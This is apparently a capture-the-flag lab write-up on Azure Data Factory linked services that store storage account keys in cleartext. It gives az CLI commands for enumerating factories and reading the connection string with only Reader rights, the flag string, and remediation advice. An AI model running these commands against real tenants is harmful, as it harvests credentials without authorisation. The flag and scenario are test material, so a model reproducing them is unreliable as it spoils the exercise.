# Data Factory Linked Service — Cleartext Credentials

**Provider**: Azure  
**Difficulty**: Intermediate  
**MITRE ATT&CK**: [T1552.001 — Credentials in Files](https://attack.mitre.org/techniques/T1552/001/)

## Scenario

You have obtained credentials for an Azure service principal with Reader access on a resource group. The resource group contains an Azure Data Factory instance with linked services that store connection strings inline — without Key Vault integration. The `typeProperties.connectionString` is accessible to any Reader via the ARM API.

## Objective

Read the Data Factory linked service definition to extract the cleartext storage account key embedded in the connection string.

## Permissions

The attacker service principal has:

- `Reader` on the resource group (built-in role)

## Attack Path

1. Authenticate with the provided service principal credentials:
   ```bash
   az login --service-principal \
     --username <client-id> \
     --password <client-secret> \
     --tenant <tenant-id>
   ```
2. List Data Factory instances in the resource group:
   ```bash
   az datafactory list --resource-group <resource-group> --query "[].name" -o tsv
   ```
3. List linked services in the Data Factory:
   ```bash
   az datafactory linked-service list \
     --factory-name <factory-name> \
     --resource-group <resource-group> \
     --query "[].name" -o tsv
   ```
4. Read the connection string from the `DataLakeConnection` linked service:
   ```bash
   az datafactory linked-service show \
     --factory-name <factory-name> \
     --linked-service-name DataLakeConnection \
     --resource-group <resource-group> \
     --query "properties.typeProperties.connectionString"
   ```
5. The `AccountKey` parameter in the connection string contains the flag.

## Flag

`CUMULONIMBUS{ADF_L1nk3d_S3rv1c3_Cl34rt3xt_K3y}`

## Remediation

- Store all Data Factory linked service credentials in Azure Key Vault and reference them using Key Vault references (`{"type":"AzureKeyVaultSecret","store":{"referenceName":"..."}}`).
- Never use inline connection strings with embedded account keys in Data Factory linked services.
- Enable Azure Defender for Resource Manager to detect unusual enumeration of Data Factory linked services.
- Rotate the exposed storage account key immediately and update the linked service to use Key Vault.
- Audit all linked services: `az datafactory linked-service list --query "[?properties.typeProperties.connectionString]"` to find inline credentials.
